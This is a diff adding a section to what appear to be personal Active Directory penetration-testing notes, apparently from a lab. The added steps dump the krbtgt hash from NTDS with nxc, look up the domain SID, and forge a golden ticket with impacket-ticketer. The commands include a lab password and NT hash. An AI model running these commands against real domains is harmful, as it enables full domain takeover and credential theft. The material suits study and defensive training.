@@ -521,3 +521,35 @@ impacket-reg "cs.org"/"stephanie.clara":"password"@"192.168.232.129" backup -o '
 <img width="1079" height="309" alt="image" src="https://github.com/user-attachments/assets/eaa4ce58-b71d-403c-bf5d-93d8f6d174f0" />
 
 -----------------
+
+### Grabbing ntds with nxc
+
+-------------------
+
+- Command-:
+
+```bash
+nxc smb  10.1.129.131 -d dc01.martini.bars -u 'athena.t0' -p '1dirtymartini' --ntds --user krbtgt
+```
+
+<img width="1904" height="242" alt="image" src="https://github.com/user-attachments/assets/f7e01e43-4954-49ef-bbb1-e77fade8094b" />
+
+- Forging a golden ticket with krbtgt-:
+
+>A Golden Ticket attack consists of the creation of a legitimate Ticket Granting Ticket (TGT) impersonating any user through the use of the NTLM hash of the Active Directory (AD) krbtgt account. This technique is particularly advantageous because it enables access to any service or machine within the domain as the impersonated user. It’s crucial to remember that the krbtgt account’s credentials are never automatically updated.To acquire the NTLM hash of the krbtgt account, various methods can be employed. It can be extracted from the Local Security Authority Subsystem Service (LSASS) process or the NT Directory Services (NTDS.dit) file located on any Domain Controller (DC) within the domain. Furthermore, executing a DCsync attack is another strategy to obtain this NTLM hash, which can be performed using tools such as the lsadump::dcsync module in Mimikatz or the secretsdump.py script by Impacket. It’s important to underscore that to undertake these operations, domain admin privileges or a similar level of access is typically required.[2]
+
+- Finding Domain sids-:
+
+```pwsh
+Get-ADDomain | Select-Object -ExpandProperty DomainSID
+```
+
+<img width="990" height="137" alt="image" src="https://github.com/user-attachments/assets/1a9da912-59ce-46ac-8313-31fb3475542e" />
+
+- Crafting it with `impacket-ticketer`-:
+
+```bash
+impacket-ticketer -nthash 22ebc290e67668629c8d0812662a9c51  -domain-sid S-1-5-21-3716536509-2861296316-2740169710   -domain dry.martini.bars Administrator
+```
+
+- 
